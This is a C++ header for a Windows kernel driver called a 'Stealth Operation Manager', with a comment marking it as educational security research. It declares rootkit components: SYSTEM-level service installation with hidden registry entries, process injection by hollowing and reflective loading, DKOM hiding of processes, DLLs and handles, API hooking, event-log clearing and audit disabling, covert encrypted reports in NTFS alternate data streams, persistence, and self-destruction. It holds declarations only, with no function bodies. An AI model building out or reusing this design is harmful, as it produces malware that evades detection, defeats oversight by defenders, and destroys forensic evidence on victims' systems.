#pragma once

// Stealth Operation Manager
// Purpose: Complete invisibility and background operation
// Implementation: Windows service with SYSTEM privileges and process injection
//
// This component implements Requirement 15: Stealth Operation and Background Analysis
// Framework operates 100% in background with zero GUI/CLI interfaces
//
// Educational Security Research Purpose Only

#include <ntddk.h>
#include <wdf.h>
#include <ntstrsafe.h>
#include "MemoryManagement.h"
#include "Concurrency.h"
#include "ModernCpp.h"

// Forward declarations
typedef struct _STEALTH_OPERATION_STATE STEALTH_OPERATION_STATE;
typedef struct _SERVICE_CONFIGURATION SERVICE_CONFIGURATION;
typedef struct _PROCESS_INJECTION_CONFIG PROCESS_INJECTION_CONFIG;
typedef struct _DKOM_CONFIGURATION DKOM_CONFIGURATION;
typedef struct _NTFS_ADS_CONFIG NTFS_ADS_CONFIG;

// Stealth Operation State Structure
struct _STEALTH_OPERATION_STATE {
    WCHAR ServiceName[64];
    HANDLE ServiceHandle;
    HANDLE TargetProcess;
    PVOID InjectedCode;
    SIZE_T CodeSize;
    BOOLEAN MemoryEncrypted;
    UINT8 EncryptionKey[32];
    BOOLEAN ApiMaskingActive;
    ULONG HiddenProcesses;
    LIST_ENTRY HiddenProcessList;
    FAST_MUTEX StateLock;
    BOOLEAN Initialized;
    BOOLEAN ServiceInstalled;
    BOOLEAN ProcessInjected;
    BOOLEAN DKOMActive;
    BOOLEAN ADSReportingActive;
};

// Service Configuration Structure
struct _SERVICE_CONFIGURATION {
    WCHAR ServiceName[64];
    WCHAR DisplayName[64];
    WCHAR Description[128];
    WCHAR BinaryPath[MAX_PATH];
    DWORD ServiceType;
    DWORD StartType;
    DWORD ErrorControl;
    WCHAR Dependencies[256];
    WCHAR AccountName[64];
    WCHAR Password[64];
    BOOLEAN AutoRestart;
    DWORD RestartDelay;
    WCHAR FailureActions[128];
    BOOLEAN RegistryHidden;
    WCHAR RegistryPath[260];
};

// Process Injection Configuration
struct _PROCESS_INJECTION_CONFIG {
    WCHAR TargetProcessName[64];
    DWORD TargetProcessId;
    WCHAR InjectionMethod[32];
    SIZE_T PayloadSize;
    PVOID PayloadData;
    BOOLEAN UseReflectiveLoading;
    BOOLEAN UseProcessHollowing;
    BOOLEAN UseManualMapping;
    WCHAR DecoyProcessName[64];
    BOOLEAN ProcessNameObfuscation;
    WCHAR ObfuscatedName[64];
};

// DKOM (Direct Kernel Object Manipulation) Configuration
struct _DKOM_CONFIGURATION {
    BOOLEAN RemoveFromEPROCESSList;
    BOOLEAN RemoveFromPsActiveProcessHead;
    BOOLEAN HideFromHandleTable;
    BOOLEAN ConcealThreads;
    BOOLEAN HideDLLs;
    BOOLEAN ManipulatePEB;
    ULONG ProcessIdToHide;
    PEPROCESS ProcessObject;
    LIST_ENTRY OriginalProcessLinks;
    BOOLEAN BackupCreated;
    PVOID BackupData;
    SIZE_T BackupSize;
};

// NTFS Alternate Data Stream Configuration
struct _NTFS_ADS_CONFIG {
    WCHAR BaseFileName[MAX_PATH];
    WCHAR StreamName[64];
    BOOLEAN EncryptionEnabled;
    UINT8 EncryptionKey[32];
    UINT8 EncryptionIV[16];
    BOOLEAN CompressionEnabled;
    BOOLEAN SteganographyEnabled;
    WCHAR CoverFile[MAX_PATH];
    ULONG MaxReportSize;
    ULONG ReportInterval;
    BOOLEAN AutoCleanup;
    ULONG CleanupAgeDays;
};

// Stealth Operation Manager Class
class CStealthOperationManager {
private:
    STEALTH_OPERATION_STATE m_State;
    SERVICE_CONFIGURATION m_ServiceConfig;
    PROCESS_INJECTION_CONFIG m_InjectionConfig;
    DKOM_CONFIGURATION m_DKOMConfig;
    NTFS_ADS_CONFIG m_ADSConfig;
    
    // Internal helper methods
    NTSTATUS GenerateLegitimateServiceName(_Out_ PWCHAR ServiceName);
    NTSTATUS GenerateRandomEncryptionKey(_Out_ PUINT8 KeyBuffer);
    NTSTATUS FindLegitimateProcess(_Out_ PDWORD ProcessId, _Out_ PWCHAR ProcessName);
    NTSTATUS BackupOriginalStructure(_In_ PVOID Structure, _In_ SIZE_T Size);
    NTSTATUS RestoreOriginalStructure(_In_ PVOID Structure);
    
public:
    // Constructor and Destructor
    CStealthOperationManager();
    ~CStealthOperationManager();
    
    // Core Interface Methods
    NTSTATUS Initialize();
    NTSTATUS Shutdown();
    
    // Service Management Methods
    NTSTATUS InstallAsService(_In_opt_ PSERVICE_CONFIGURATION Config = nullptr);
    NTSTATUS UninstallService();
    NTSTATUS StartServiceOperation();
    NTSTATUS StopServiceOperation();
    NTSTATUS ConfigureService(_In_ PSERVICE_CONFIGURATION Config);
    
    // Process Injection Methods
    NTSTATUS InjectIntoProcess(_In_opt_ PPROCESS_INJECTION_CONFIG Config = nullptr);
    NTSTATUS EjectFromProcess();
    NTSTATUS ObfuscateProcessName(_In_ PWCHAR NewName);
    NTSTATUS RestoreProcessName();
    
    // Memory Encryption Methods
    NTSTATUS EncryptMemory(_In_ PVOID Address, _In_ SIZE_T Size);
    NTSTATUS DecryptMemory(_In_ PVOID Address, _In_ SIZE_T Size);
    NTSTATUS SetupMemoryEncryption();
    NTSTATUS TeardownMemoryEncryption();
    
    // API Masking Methods
    NTSTATUS MaskAPICalls();
    NTSTATUS UnmaskAPICalls();
    NTSTATUS HookCriticalAPIs();
    NTSTATUS UnhookCriticalAPIs();
    
    // Log Suppression Methods
    NTSTATUS SuppressLogging();
    NTSTATUS RestoreLogging();
    NTSTATUS ClearEventLogs();
    NTSTATUS DisableAuditing();
    
    // DKOM Methods
    NTSTATUS RemoveFromProcessList(_In_opt_ PDKOM_CONFIGURATION Config = nullptr);
    NTSTATUS RestoreToProcessList();
    NTSTATUS HideDLLs();
    NTSTATUS UnhideDLLs();
    NTSTATUS ManipulateHandles();
    NTSTATUS RestoreHandles();
    
    // NTFS Alternate Data Stream Methods
    NTSTATUS SetupADSReporting(_In_opt_ PNTFS_ADS_CONFIG Config = nullptr);
    NTSTATUS TeardownADSReporting();
    NTSTATUS WriteEncryptedReport(_In_ PVOID Data, _In_ SIZE_T Size);
    NTSTATUS ReadEncryptedReport(_Out_ PVOID* Data, _Out_ PSIZE_T Size);
    NTSTATUS CleanupOldReports();
    
    // Persistence Methods
    NTSTATUS EstablishPersistence();
    NTSTATUS RemovePersistence();
    NTSTATUS CreateRegistryPersistence();
    NTSTATUS RemoveRegistryPersistence();
    NTSTATUS CreateScheduledTask();
    NTSTATUS RemoveScheduledTask();
    
    // Self-Destruction Methods
    NTSTATUS ImplementSelfDestruct();
    NTSTATUS SecureMemoryWipe(_In_ PVOID Address, _In_ SIZE_T Size);
    NTSTATUS DeleteAllTraces();
    
    // Utility Methods
    BOOLEAN IsInitialized() const { return m_State.Initialized; }
    BOOLEAN IsServiceInstalled() const { return m_State.ServiceInstalled; }
    BOOLEAN IsProcessInjected() const { return m_State.ProcessInjected; }
    BOOLEAN IsDKOMActive() const { return m_State.DKOMActive; }
    BOOLEAN IsADSReportingActive() const { return m_State.ADSReportingActive; }
    
    NTSTATUS GetStatus(_Out_ PSTEALTH_OPERATION_STATE State);
    NTSTATUS GetServiceConfig(_Out_ PSERVICE_CONFIGURATION Config);
    NTSTATUS GetInjectionConfig(_Out_ PPROCESS_INJECTION_CONFIG Config);
    NTSTATUS GetDKOMConfig(_Out_ PDKOM_CONFIGURATION Config);
    NTSTATUS GetADSConfig(_Out_ PNTFS_ADS_CONFIG Config);
};

// Global instance
extern CStealthOperationManager* g_pStealthOperationManager;

// C interface for kernel driver
extern "C" {
    NTSTATUS StealthOperationManagerInitialize();
    NTSTATUS StealthOperationManagerShutdown();
    NTSTATUS StealthOperationManagerInstallService();
    NTSTATUS StealthOperationManagerStartOperation();
    NTSTATUS StealthOperationManagerStopOperation();
    BOOLEAN StealthOperationManagerIsActive();
}

// Validates: Requirements 15 (Stealth Operation and Background Analysis)